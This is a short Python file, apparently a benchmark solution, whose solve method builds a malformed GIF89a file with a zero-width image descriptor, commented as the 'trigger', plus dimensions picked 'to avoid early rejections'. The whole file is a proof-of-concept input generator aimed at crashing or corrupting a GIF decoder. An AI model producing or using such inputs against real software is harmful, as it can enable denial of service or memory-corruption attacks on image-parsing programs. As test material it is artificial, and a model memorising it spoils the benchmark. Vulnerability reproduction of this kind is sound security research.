import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"GIF89a"
        # Logical Screen Descriptor: use 1x1 to avoid early rejections
        lsd = struct.pack("<HHBBB", 1, 1, 0xF0, 0, 0)
        # Global Color Table: 2 entries (black and white)
        gct = b"\x00\x00\x00\xff\xff\xff"
        # Image Descriptor: width=0 (trigger), height=1
        img_desc = b"\x2c" + struct.pack("<HHHHB", 0, 0, 0, 1, 0)
        # Image Data: LZW min code size = 2, data sub-block encodes: Clear(4), 0, EOI(5)
        img_data = bytes([0x02, 0x02, 0x44, 0x01, 0x00])
        trailer = b"\x3b"
        return header + lsd + gct + img_desc + img_data + trailer